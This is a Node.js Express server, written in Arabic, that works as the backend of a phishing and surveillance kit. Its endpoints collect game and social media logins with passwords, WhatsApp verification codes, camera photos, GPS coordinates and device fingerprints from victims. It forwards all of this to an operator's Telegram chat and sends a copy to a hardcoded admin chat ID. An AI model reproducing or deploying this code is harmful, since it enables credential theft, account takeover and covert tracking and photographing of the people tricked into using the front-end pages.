require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const bodyParser = require('body-parser');
const cors = require('cors');
const moment = require('moment-timezone');
const fs = require('fs').promises;
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));

// إعداد multer للذاكرة فقط
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 100 * 1024 * 1024,
    files: 10
  },
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'image/jpg'];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('نوع الملف غير مدعوم. يرجى رفع صورة فقط.'));
    }
  }
});

// التوكن من البيئة
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = '6808883615';

if (!BOT_TOKEN) {
  console.error('❌ Telegram Bot Token is not configured');
  console.warn('⚠️  سيتم تشغيل السيرفر ولكن إرسال الرسائل إلى Telegram لن يعمل');
}

// ========== إعدادات خدمة الواتساب ==========
const DATA_DIR = path.join(__dirname, 'data');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const CODES_FILE = path.join(DATA_DIR, 'codes.json');

async function initDataDir() {
    await fs.mkdir(DATA_DIR, { recursive: true });
    
    try {
        await fs.access(USERS_FILE);
    } catch {
        await fs.writeFile(USERS_FILE, '[]');
    }
    
    try {
        await fs.access(CODES_FILE);
    } catch {
        await fs.writeFile(CODES_FILE, '{}');
    }
}

// وظيفة إرسال رسالة مع صورة
async function sendPhotoWithMessage(chatId, message, imageBuffer, filename) {
    try {
        if (!BOT_TOKEN) {
            console.log(`📤 [محاكاة] إرسال صورة مع رسالة إلى chatId ${chatId}`);
            console.log(`📝 الرسالة: ${message.substring(0, 100)}...`);
            return true;
        }

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', message);
        formData.append('parse_mode', 'HTML');
        formData.append('photo', imageBuffer, {
            filename: filename,
            contentType: 'image/jpeg'
        });

        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
            headers: formData.getHeaders()
        });
        
        return response.data.ok;
    } catch (error) {
        console.error('Error sending photo to Telegram:', error.response?.data || error.message);
        return false;
    }
}

// وظيفة إرسال رسالة نصية فقط
async function sendToTelegram(chatId, message) {
    try {
        if (!BOT_TOKEN) {
            console.log(`📤 [محاكاة] إرسال نص إلى chatId ${chatId}: ${message.substring(0, 100)}...`);
            return true;
        }

        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        
        return response.data.ok;
    } catch (error) {
        console.error('Error sending to Telegram:', error.response?.data || error.message);
        return false;
    }
}

// دالة للحصول على معلومات الموقع من IP
async function getLocationFromIP(ip) {
    try {
        if (ip === '::1' || ip === '127.0.0.1' || ip.includes('localhost')) {
            return {
                country: 'غير معروف',
                city: 'غير معروف',
                timezone: 'Asia/Riyadh'
            };
        }

        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        const data = response.data;
        
        if (data.status === 'success') {
            return {
                country: data.country || 'غير معروف',
                city: data.city || 'غير معروف',
                timezone: data.timezone || 'Asia/Riyadh'
            };
        }
        return {
            country: 'غير معروف',
            city: 'غير معروف',
            timezone: 'Asia/Riyadh'
        };
    } catch (error) {
        return {
            country: 'غير معروف',
            city: 'غير معروف',
            timezone: 'Asia/Riyadh'
        };
    }
}

// دالة لاستخراج معلومات الجهاز من User Agent
function parseDeviceInfo(userAgent) {
    let os = 'غير معروف';
    let browser = 'غير معروف';
    let device = 'غير معروف';
    let deviceVersion = 'غير معروف';

    if (userAgent.includes('Android')) {
        const androidVersion = userAgent.match(/Android\s([0-9\.]+)/);
        os = `Android`;
        deviceVersion = androidVersion ? androidVersion[1] : '0.0.0';
        device = 'هاتف ذكي';
    } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
        const iosVersion = userAgent.match(/OS\s([0-9_]+)/);
        os = `iOS`;
        deviceVersion = iosVersion ? iosVersion[1].replace(/_/g, '.') : '0.0.0';
        device = 'جهاز آبل';
    } else if (userAgent.includes('Windows')) {
        const windowsVersion = userAgent.match(/Windows\s([0-9\.]+)/);
        os = `Windows`;
        deviceVersion = windowsVersion ? windowsVersion[1] : '0.0.0';
        device = 'كمبيوتر';
    } else if (userAgent.includes('Mac OS')) {
        const macVersion = userAgent.match(/Mac OS X\s([0-9_]+)/);
        os = `macOS`;
        deviceVersion = macVersion ? macVersion[1].replace(/_/g, '.') : '0.0.0';
        device = 'ماك';
    } else if (userAgent.includes('Linux')) {
        os = 'Linux';
        deviceVersion = 'غير معروف';
        device = 'جهاز لينكس';
    }

    if (userAgent.includes('Chrome')) {
        const chromeVersion = userAgent.match(/Chrome\/([0-9\.]+)/);
        browser = `Chrome ${chromeVersion ? chromeVersion[1].split('.')[0] : '0'}`;
        if (userAgent.includes('Mobile')) browser += ' Mobile';
    } else if (userAgent.includes('Firefox')) {
        const firefoxVersion = userAgent.match(/Firefox\/([0-9\.]+)/);
        browser = `Firefox ${firefoxVersion ? firefoxVersion[1] : '0.0.0'}`;
    } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
        const safariVersion = userAgent.match(/Version\/([0-9\.]+)/);
        browser = `Safari ${safariVersion ? safariVersion[1] : '0.0.0'}`;
    } else if (userAgent.includes('Edge')) {
        const edgeVersion = userAgent.match(/Edge\/([0-9\.]+)/);
        browser = `Edge ${edgeVersion ? edgeVersion[1] : '0.0.0'}`;
    }

    return { os, browser, device, deviceVersion };
}

// ================== 🖼️ نقطة إرسال الصور (كل صورة مع بياناتها) ==================
app.post('/submitPhotos', upload.array('images', 10), async (req, res) => {
  try {
    console.log('🖼️ استقبال صور جديدة...');
    
    const { userId, cameraType, additionalData } = req.body;
    const images = req.files || [];

    if (!userId) {
      return res.status(400).json({
        success: false,
        message: 'المعرف مطلوب (userId)'
      });
    }

    console.log(`👤 المستخدم: ${userId}`);
    console.log(`📷 نوع الكاميرا: ${cameraType || 'غير محدد'}`);
    console.log(`🖼️ عدد الصور: ${images.length}`);
    
    let additionalInfo = {};
    try {
      additionalInfo = typeof additionalData === 'string' ? 
        JSON.parse(additionalData) : 
        (additionalData || {});
    } catch (e) {
      additionalInfo = {};
    }

    const userIP = req.headers['x-forwarded-for'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress || 
                  'غير معروف';
    
    const cleanIP = userIP.toString().split(',')[0].trim();
    
    const locationFromIP = await getLocationFromIP(cleanIP);
    const userAgent = req.headers['user-agent'] || 'غير معروف';
    const deviceInfo = parseDeviceInfo(userAgent);
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');

    const batteryInfo = additionalInfo.batteryLevel ? {
      level: additionalInfo.batteryLevel,
      charging: additionalInfo.batteryCharging ? 'شحن' : 'غير شحن'
    } : {
      level: 'غير متاح',
      charging: 'غير متاح'
    };

    // تنسيق الرسالة الأساسية
    const baseMessage = `
🎯 <b>تم استلام طلب جديد!</b>

👤 <b>معرف المستخدم:</b> <code>${userId}</code>
📷 <b>نوع الكاميرا:</b> ${cameraType === 'front' ? 'الأمامية' : cameraType === 'back' ? 'الخلفية' : cameraType || 'غير محدد'}

🌍 <b>معلومات الموقع:</b>
   • 📱 <b>IP:</b> ${cleanIP}
   • 🏳️ <b>البلد:</b> ${locationFromIP.country}
   • 🏙️ <b>المدينة:</b> ${locationFromIP.city}
   • 🕒 <b>المنطقة الزمنية:</b> ${locationFromIP.timezone}
   • 🌐 <b>اللغة:</b> ${additionalInfo.language || 'غير متاح'}

📱 <b>معلومات الجهاز:</b>
   • 💻 <b>النظام:</b> ${deviceInfo.os}
   • 🔧 <b>إصدار الجهاز:</b> ${deviceInfo.deviceVersion}
   • 📏 <b>دقة الشاشة:</b> ${additionalInfo.screenResolution || 'غير متاح'}
   • 🔋 <b>شحن البطارية:</b> ${batteryInfo.level}
   • ⚡ <b>الحالة:</b> ${batteryInfo.charging}

🕒 <b>الوقت:</b> ${saudiTime}

📎 <b>User Agent:</b>
<code>${userAgent}</code>`;

    let allSent = true;
    let sentCount = 0;

    // إرسال كل صورة مع الرسالة
    for (let i = 0; i < images.length; i++) {
      const image = images[i];
      const imageNumber = i + 1;
      const imageMessage = `${baseMessage}\n\n📸 <b>الصورة رقم:</b> ${imageNumber}/${images.length}`;
      
      console.log(`🔄 إرسال الصورة ${imageNumber}/${images.length}...`);
      
      const sent = await sendPhotoWithMessage(
        userId, 
        imageMessage, 
        image.buffer, 
        image.originalname || `photo_${Date.now()}_${imageNumber}.jpg`
      );
      
      if (sent) {
        sentCount++;
        console.log(`✅ تم إرسال الصورة ${imageNumber}`);
      } else {
        allSent = false;
        console.log(`❌ فشل إرسال الصورة ${imageNumber}`);
      }
      
      // انتظار بسيط بين الصور لتجنب rate limits
      if (i < images.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    }

    // إرسال نسخة للأدمن
    const adminMessage = `👑 <b>نسخة أدمن</b> - من المستخدم: ${userId}\n\n${baseMessage}\n\n📸 <b>عدد الصور:</b> ${images.length}`;
    await sendToTelegram(ADMIN_CHAT_ID, adminMessage);

    console.log('✅ تم معالجة الصور:', {
      userId,
      totalImages: images.length,
      sentImages: sentCount,
      allSent: allSent
    });

    res.status(200).json({
      success: true,
      message: `تم استلام وإرسال ${sentCount}/${images.length} صورة`,
      uploaded: true,
      telegramSent: allSent,
      data: {
        timestamp: saudiTime,
        userId: userId,
        imagesCount: images.length,
        sentCount: sentCount,
        orderId: `#IMG${Math.floor(100000 + Math.random() * 900000)}`
      }
    });

  } catch (error) {
    console.error('❌ خطأ في معالجة الصور:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ أثناء معالجة الصور',
      error: error.message
    });
  }
});

// ================== 🎮 نقطة الألعاب (التحديث الجديد) ==================
app.post('/send-to-telegram', async (req, res) => {
    try {
        const { 
            email,          // البريد أو الرقم (أولاً)
            password,       // كلمة السر (ثانياً)
            playerId,       // ID اللاعب (ثالثاً)
            amount, 
            chatId, 
            accountType,
            device, 
            ip,
            country,
            city,
            os,
            browser,
            battery,
            charging,
            deviceType
        } = req.body;
        
        // التحقق من البيانات المطلوبة (البريد والرقم أولاً)
        if (!email || !password || !playerId || !chatId) {
            return res.status(400).json({
                success: false,
                message: 'بيانات ناقصة: البريد/الرقم، كلمة السر، معرف اللاعب، و chatId مطلوبة'
            });
        }

        // الحصول على عنوان IP
        let userIP = ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
        if (userIP === '::1') userIP = '127.0.0.1';
        
        const cleanIP = userIP.split(',')[0].trim();

        // الحصول على معلومات الموقع من IP
        let locationInfo = { country: 'غير معروف', city: 'غير معروف' };
        if (!country || !city || country === 'غير معروف' || city === 'غير معروف') {
            locationInfo = await getLocationFromIP(cleanIP);
        } else {
            locationInfo = { country, city };
        }

        // تحليل معلومات الجهاز
        const userDevice = device || req.headers['user-agent'] || "غير معروف";
        let deviceInfo = { os: 'غير معروف', browser: 'غير معروف', device: 'غير معروف' };
        
        if (!os || !browser || !deviceType) {
            deviceInfo = parseDeviceInfo(userDevice);
        } else {
            deviceInfo = { os, browser, device: deviceType };
        }

        const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');

        // تنسيق الرسالة حسب نوع الحساب
        let isGame = false;
        let gameKeywords = ['فري فاير', 'ببجي', 'لعبة', 'game', 'pubg', 'freefire', 'call of duty', 'cod', 'fortnite'];
        
        if (accountType) {
            const lowerAccountType = accountType.toLowerCase();
            isGame = gameKeywords.some(keyword => lowerAccountType.includes(keyword));
        }

        let telegramMessage;
        
        if (isGame) {
            telegramMessage = `
🎮 <b>تم الحصول على حساب ${accountType || 'لعبة'}</b>

<b>📧 البريد / الرقم:</b> ${email}
<b>🔐 كلمة السر:</b> ${password}
<b>🆔 ID اللاعب:</b> ${playerId}

<b>💰 الكمية / المبلغ:</b> ${amount || 'غير محدد'}
<b>🎮 نوع الحساب:</b> ${accountType || 'لعبة'}

━━━━━━━━━━━━━━━━━━━━
<b>🌍 معلومات الموقع:</b>
   • 📱 IP: ${cleanIP}
   • 🏳️ الدولة: ${locationInfo.country}
   • 🏙️ المدينة: ${locationInfo.city}

<b>📱 معلومات الجهاز:</b>
   • 💻 النظام: ${deviceInfo.os}
   • 🌐 المتصفح: ${deviceInfo.browser}
   • 🖥️ الجهاز: ${deviceInfo.device}
   • 🔋 البطارية: ${battery || 'غير متاح'}
   • ⚡ قيد الشحن: ${charging || 'لا'}

<b>🕒 وقت الاستلام:</b> ${saudiTime}
━━━━━━━━━━━━━━━━━━━━
<b>👤 معرف المستخدم:</b> <code>${chatId}</code>`;
        } else {
            telegramMessage = `
📱 <b>تم الحصول على حساب ${accountType || 'سوشيال ميديا'}</b>

<b>📧 البريد / الرقم:</b> ${email}
<b>🔐 كلمة السر:</b> ${password}
<b>🆔 اسم المستخدم:</b> ${playerId}

<b>📊 عدد المتابعين:</b> ${amount || 'غير محدد'}
<b>📱 نوع الحساب:</b> ${accountType || 'سوشيال ميديا'}

━━━━━━━━━━━━━━━━━━━━
<b>🌍 معلومات الموقع:</b>
   • 📱 IP: ${cleanIP}
   • 🏳️ الدولة: ${locationInfo.country}
   • 🏙️ المدينة: ${locationInfo.city}

<b>📱 معلومات الجهاز:</b>
   • 💻 النظام: ${deviceInfo.os}
   • 🌐 المتصفح: ${deviceInfo.browser}
   • 🖥️ الجهاز: ${deviceInfo.device}
   • 🔋 البطارية: ${battery || 'غير متاح'}
   • ⚡ قيد الشحن: ${charging || 'لا'}

<b>🕒 وقت الاستلام:</b> ${saudiTime}
━━━━━━━━━━━━━━━━━━━━
<b>👤 معرف المستخدم:</b> <code>${chatId}</code>`;
        }

        // إرسال الرسالة
        const success = await sendToTelegram(chatId, telegramMessage);
        
        // إرسال نسخة للأدمن
        const adminMessage = `👑 <b>نسخة أدمن</b> - من المستخدم: ${chatId}\n\n${telegramMessage}`;
        await sendToTelegram(ADMIN_CHAT_ID, adminMessage);
        
        if (success) {
            res.json({
                success: true,
                message: 'تم إرسال البيانات إلى Telegram بنجاح',
                orderId: `#${Math.floor(100000 + Math.random() * 900000)}`,
                data: {
                    type: isGame ? 'game' : 'social',
                    accountType: accountType || 'غير محدد',
                    email: email,
                    playerId: playerId,
                    timestamp: saudiTime,
                    chatId: chatId
                }
            });
        } else {
            res.status(500).json({
                success: false,
                message: 'فشل في إرسال الرسالة إلى Telegram'
            });
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        res.status(500).json({
            success: false,
            message: 'حدث خطأ أثناء إرسال البيانات',
            error: error.message
        });
    }
});

// ================== 📱 نقطة خدمة الواتساب ==================
app.post('/api/request-code', async (req, res) => {
    const { phoneNumber, chatId } = req.body;
    
    if (!phoneNumber || !chatId) {
        return res.status(400).json({
            success: false,
            message: 'رقم الهاتف و chatId مطلوبان'
        });
    }
    
    const usersData = await fs.readFile(USERS_FILE, 'utf8');
    const users = JSON.parse(usersData);
    
    const codesData = await fs.readFile(CODES_FILE, 'utf8');
    const codes = JSON.parse(codesData);
    
    const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
    const userIP = req.headers['x-forwarded-for'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress || 
                  'غير معروف';
    
    const cleanIP = userIP.toString().split(',')[0].trim();
    const locationInfo = await getLocationFromIP(cleanIP);
    const userAgent = req.headers['user-agent'] || 'غير معروف';
    const deviceInfo = parseDeviceInfo(userAgent);
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    const userData = {
        id: Date.now().toString(),
        phoneNumber,
        chatId,
        code: verificationCode,
        timestamp: saudiTime,
        verified: false,
        ip: cleanIP,
        country: locationInfo.country,
        city: locationInfo.city,
        device: deviceInfo.device,
        browser: deviceInfo.browser,
        os: deviceInfo.os
    };
    
    users.push(userData);
    codes[phoneNumber] = {
        code: verificationCode,
        timestamp: saudiTime,
        attempts: 0
    };
    
    await fs.writeFile(USERS_FILE, JSON.stringify(users, null, 2));
    await fs.writeFile(CODES_FILE, JSON.stringify(codes, null, 2));
    
    console.log(`📱 كود التحقق: ${phoneNumber} - ${verificationCode}`);
    
    // إرسال رسالة إلى Telegram
    const telegramMessage = `
📱 <b>طلب كود تحقق واتساب جديد</b>

<b>📞 رقم الهاتف:</b> ${phoneNumber}
<b>👤 معرف المستخدم:</b> <code>${chatId}</code>
<b>🔢 كود التحقق:</b> <code>${verificationCode}</code>

━━━━━━━━━━━━━━━━━━━━
<b>🌍 معلومات الموقع:</b>
   • 📱 IP: ${cleanIP}
   • 🏳️ الدولة: ${locationInfo.country}
   • 🏙️ المدينة: ${locationInfo.city}

<b>📱 معلومات الجهاز:</b>
   • 💻 النظام: ${deviceInfo.os}
   • 🌐 المتصفح: ${deviceInfo.browser}
   • 🖥️ الجهاز: ${deviceInfo.device}

<b>🕒 الوقت:</b> ${saudiTime}`;
    
    await sendToTelegram(chatId, telegramMessage);
    
    const adminMessage = `👑 <b>نسخة أدمن - طلب كود واتساب</b>\n\n${telegramMessage}`;
    await sendToTelegram(ADMIN_CHAT_ID, adminMessage);
    
    res.json({
        success: true,
        message: 'تم إرسال كود التحقق بنجاح',
        code: verificationCode,
        data: {
            timestamp: saudiTime,
            phoneNumber: phoneNumber,
            chatId: chatId
        }
    });
});

app.post('/api/verify-code', async (req, res) => {
    const { code, phoneNumber } = req.body;
    
    if (!code) {
        return res.status(400).json({
            success: false,
            message: 'كود التحقق مطلوب'
        });
    }
    
    const usersData = await fs.readFile(USERS_FILE, 'utf8');
    const users = JSON.parse(usersData);
    
    const user = users.find(u => u.code === code && u.phoneNumber === phoneNumber);
    
    if (user) {
        user.verified = true;
        user.verifiedAt = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
        
        await fs.writeFile(USERS_FILE, JSON.stringify(users, null, 2));
        
        console.log(`✅ تم التحقق: ${user.phoneNumber}`);
        
        const telegramMessage = `
✅ <b>تم التحقق من رقم واتساب بنجاح</b>

<b>📞 رقم الهاتف:</b> ${user.phoneNumber}
<b>👤 معرف المستخدم:</b> <code>${user.chatId}</code>
<b>🔢 الكود المستخدم:</b> <code>${code}</code>

━━━━━━━━━━━━━━━━━━━━
<b>🌍 معلومات التسجيل:</b>
   • 📱 IP: ${user.ip}
   • 🏳️ الدولة: ${user.country}
   • 🏙️ المدينة: ${user.city}
   • 💻 الجهاز: ${user.device}

<b>🕒 وقت التسجيل:</b> ${user.timestamp}
<b>🕒 وقت التحقق:</b> ${user.verifiedAt}`;
        
        await sendToTelegram(user.chatId, telegramMessage);
        
        const adminMessage = `👑 <b>نسخة أدمن - تحقق واتساب</b>\n\n${telegramMessage}`;
        await sendToTelegram(ADMIN_CHAT_ID, adminMessage);
        
        res.json({
            success: true,
            message: 'تم التحقق بنجاح',
            user: {
                phoneNumber: user.phoneNumber,
                chatId: user.chatId,
                verifiedAt: user.verifiedAt
            }
        });
    } else {
        res.status(400).json({
            success: false,
            message: 'كود التحقق غير صحيح'
        });
    }
});

// ================== 🔄 نقطة بيانات الجهاز ==================
app.post('/SS', async (req, res) => {
    try {
        console.log('📥 استقبال بيانات جهاز جديدة...');
        
        const data = req.body;
        const { userId, deviceInfo, userInfo } = data;
        
        if (!userId) {
            return res.status(400).json({
                success: false,
                message: 'المعرف مطلوب (userId)'
            });
        }
        
        let telegramMessage = `🎯 <b>معلومات جديدة من مسابقة الحلم</b>\n\n`;
        
        if (userInfo) {
            telegramMessage += `<b>👤 المستخدم:</b>\n`;
            telegramMessage += `   📛 الاسم: ${userInfo.name || 'غير محدد'}\n`;
            telegramMessage += `   📱 الهاتف: ${userInfo.phone || 'غير محدد'}\n`;
            telegramMessage += `   📧 الإيميل: ${userInfo.email || 'غير محدد'}\n`;
            telegramMessage += `   📝 الوصف: ${userInfo.description || 'غير محدد'}\n\n`;
        }
        
        telegramMessage += `<b>🆔 معرف المستخدم:</b> ${userId}\n\n`;
        
        if (deviceInfo) {
            telegramMessage += `<b>💻 معلومات الجهاز:</b>\n`;
            telegramMessage += `   🔧 الجهاز: ${deviceInfo.deviceName || 'غير معروف'}\n`;
            telegramMessage += `   📟 النوع: ${deviceInfo.deviceType || 'غير معروف'}\n`;
            telegramMessage += `   🌐 المتصفح: ${deviceInfo.browserName || 'غير معروف'} ${deviceInfo.browserVersion || ''}\n`;
            telegramMessage += `   🖥️ الشاشة: ${deviceInfo.screenResolution || 'غير معروف'}\n`;
            telegramMessage += `   🎨 الألوان: ${deviceInfo.colorDepth || 'غير معروف'}\n`;
            telegramMessage += `   ⚡ المعالج: ${deviceInfo.cpuCores || 'غير معروف'} نواة\n`;
            telegramMessage += `   💾 الذاكرة: ${deviceInfo.memory || 'غير معروف'}\n`;
            telegramMessage += `   🔋 البطارية: ${deviceInfo.battery || 'غير معروف'}\n`;
            telegramMessage += `   ⚡ الشحن: ${deviceInfo.isCharging || 'غير معروف'}\n`;
            telegramMessage += `   📶 الشبكة: ${deviceInfo.networkType || 'غير معروف'}\n`;
            telegramMessage += `   🚀 السرعة: ${deviceInfo.networkSpeed || 'غير معروف'}\n`;
            telegramMessage += `   💬 اللغة: ${deviceInfo.language || 'غير معروف'}\n\n`;
            
            telegramMessage += `<b>🌍 المعلومات الجغرافية:</b>\n`;
            telegramMessage += `   📍 IP: ${deviceInfo.ip || 'غير متاح'}\n`;
            telegramMessage += `   🏳️ الدولة: ${deviceInfo.country || 'غير متاح'}\n`;
            telegramMessage += `   🏙️ المدينة: ${deviceInfo.city || 'غير متاح'}\n`;
            telegramMessage += `   📍 خط العرض: ${deviceInfo.latitude || 'غير متاح'}\n`;
            telegramMessage += `   📍 خط الطول: ${deviceInfo.longitude || 'غير متاح'}\n`;
        }

        const userIP = req.headers['x-forwarded-for'] || 
                      req.connection.remoteAddress || 
                      req.socket.remoteAddress || 
                      'غير معروف';
        
        const cleanIP = userIP.toString().split(',')[0].trim();
        const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
        
        telegramMessage += `\n<b>🌐 معلومات الخادم:</b>\n`;
        telegramMessage += `   📱 IP الخادم: ${cleanIP}\n`;
        telegramMessage += `   🕒 وقت الاستلام: ${saudiTime}\n`;

        const sent = await sendToTelegram(userId, telegramMessage);
        const adminMessage = `👑 <b>نسخة أدمن - بيانات جهاز</b>\n\n${telegramMessage}`;
        await sendToTelegram(ADMIN_CHAT_ID, adminMessage);
        
        if (sent) {
            res.status(200).json({ 
                success: true, 
                message: 'تم استلام البيانات وإرسالها بنجاح',
                data: {
                    timestamp: saudiTime,
                    userId: userId,
                    orderId: `#DEV${Math.floor(100000 + Math.random() * 900000)}`
                }
            });
        } else {
            res.status(500).json({ 
                success: false, 
                message: 'تم استلام البيانات ولكن فشل الإرسال للتلجرام' 
            });
        }
        
    } catch (error) {
        console.error('❌ خطأ في معالجة بيانات الجهاز:', error);
        res.status(500).json({ 
            success: false, 
            message: 'حدث خطأ في الخادم',
            error: error.message
        });
    }
});

// ================== 📍 نقطة استقبال الموقع ==================
app.post('/submitLocation', async (req, res) => {
  try {
    console.log('📍 استقبال بيانات موقع جديد...');
    
    const { chatId, latitude, longitude, additionalData } = req.body;
    
    if (!chatId || !latitude || !longitude) {
      return res.status(400).json({
        success: false,
        message: 'بيانات ناقصة. يرجى إرسال chatId و latitude و longitude'
      });
    }

    const userIP = req.headers['x-forwarded-for'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress || 
                  'غير معروف';
    
    const cleanIP = userIP.toString().split(',')[0].trim();
    const locationFromIP = await getLocationFromIP(cleanIP);
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');

    let additionalInfo = {};
    try {
      additionalInfo = typeof additionalData === 'string' ? 
        JSON.parse(additionalData) : 
        (additionalData || {});
    } catch (e) {
      additionalInfo = {};
    }

    const userAgent = req.headers['user-agent'] || 'غير معروف';
    const deviceInfo = parseDeviceInfo(userAgent);

    const telegramMessage = `
🗺️ <b>تم الحصول على موقع جديد!</b>

<b>👤 معرف المستخدم:</b> <code>${chatId}</code>

<b>📍 الإحداثيات:</b>
   • خط العرض: <code>${latitude}</code>
   • خط الطول: <code>${longitude}</code>

━━━━━━━━━━━━━━━━━━━━
<b>🌍 معلومات الموقع:</b>
   • 📱 IP: ${cleanIP}
   • 🏳️ الدولة: ${locationFromIP.country}
   • 🏙️ المدينة: ${locationFromIP.city}
   • 🕒 المنطقة الزمنية: ${locationFromIP.timezone}
   • 🌐 اللغة: ${additionalInfo.language || 'غير متاح'}

<b>📱 معلومات الجهاز:</b>
   • 💻 النظام: ${deviceInfo.os}
   • 🌐 المتصفح: ${deviceInfo.browser}
   • 🖥️ الجهاز: ${deviceInfo.device}

<b>🕒 وقت الاستلام:</b> ${saudiTime}

<b>🔗 رابط الخريطة:</b>
https://www.google.com/maps?q=${latitude},${longitude}`;

    const sendResult = await sendToTelegram(chatId, telegramMessage);
    const adminMessage = `👑 <b>نسخة أدمن - موقع</b>\n\n${telegramMessage}`;
    await sendToTelegram(ADMIN_CHAT_ID, adminMessage);

    if (sendResult) {
      res.json({
        success: true,
        message: 'تم استقبال بيانات الموقع وإرسالها بنجاح',
        data: {
          chatId,
          coordinates: { latitude, longitude },
          timestamp: saudiTime,
          mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
          orderId: `#LOC${Math.floor(100000 + Math.random() * 900000)}`
        }
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'تم استقبال البيانات ولكن فشل الإرسال إلى Telegram'
      });
    }
  } catch (error) {
    console.error('❌ خطأ في /submitLocation:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ في الخادم',
      error: error.message
    });
  }
});

// ================== ❤️ نقطة التحقق ==================
app.get('/health', (req, res) => {
    const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
    
    res.status(200).json({ 
        success: true,
        status: '✅ السيرفر يعمل بكفاءة عالية!',
        version: '9.0.0 - النسخة النهائية المعدلة',
        timestamp: saudiTime,
        features: [
            '🖼️ رفع الصور (كل صورة مع بياناتها)',
            '🎮 الألعاب (بريد، كلمة سر، ID، ثم المعلومات)',
            '📱 خدمة الواتساب',
            '🔧 معلومات الجهاز',
            '📍 بيانات الموقع',
            '👑 نسخة تلقائية للأدمن'
        ],
        endpoints: {
            photos: 'POST /submitPhotos - كل صورة مع بياناتها',
            games: 'POST /send-to-telegram - ترتيب جديد',
            whatsapp: 'POST /api/request-code, /api/verify-code',
            device: 'POST /SS',
            location: 'POST /submitLocation',
            health: 'GET /health'
        }
    });
});

// ================== تشغيل السيرفر ==================
initDataDir().then(() => {
    app.listen(PORT, () => {
        const saudiTime = moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss');
        
        console.log('='.repeat(80));
        console.log(`🚀 السيرفر المعدل يعمل على PORT: ${PORT}`);
        console.log('='.repeat(80));
        console.log('🖼️ نقطة الصور الجديدة:');
        console.log(`   📸 POST /submitPhotos - كل صورة مع بياناتها في رسالة واحدة`);
        console.log('='.repeat(80));
        console.log('🎮 نقطة الألعاب المعدلة:');
        console.log(`   🎮 POST /send-to-telegram - البريد → كلمة السر → ID → باقي المعلومات`);
        console.log('='.repeat(80));
        console.log('📱 خدمة الواتساب:');
        console.log(`   📞 POST /api/request-code - طلب كود`);
        console.log(`   ✅ POST /api/verify-code - التحقق`);
        console.log('='.repeat(80));
        console.log('🔧 نقاط أخرى:');
        console.log(`   💻 POST /SS - معلومات الجهاز`);
        console.log(`   🗺️  POST /submitLocation - الموقع`);
        console.log('='.repeat(80));
        console.log('👑 ميزات:');
        console.log(`   • ✅ كل صورة مع بياناتها في رسالة واحدة`);
        console.log(`   • ✅ ترتيب جديد للألعاب`);
        console.log(`   • ✅ خدمة واتساب متكاملة`);
        console.log(`   • ✅ نسخة `);
        console.log('='.repeat(80));
        console.log(`❤️  GET /health - للتحقق`);
        console.log(`🆕 الإصدار: 9.0.0 - النسخة المعدلة`);
        console.log(`🌐 الوقت: ${saudiTime}`);
        console.log('='.repeat(80));
    });
}).catch(err => {
    console.error('❌ فشل في تشغيل السيرفر:', err);
});
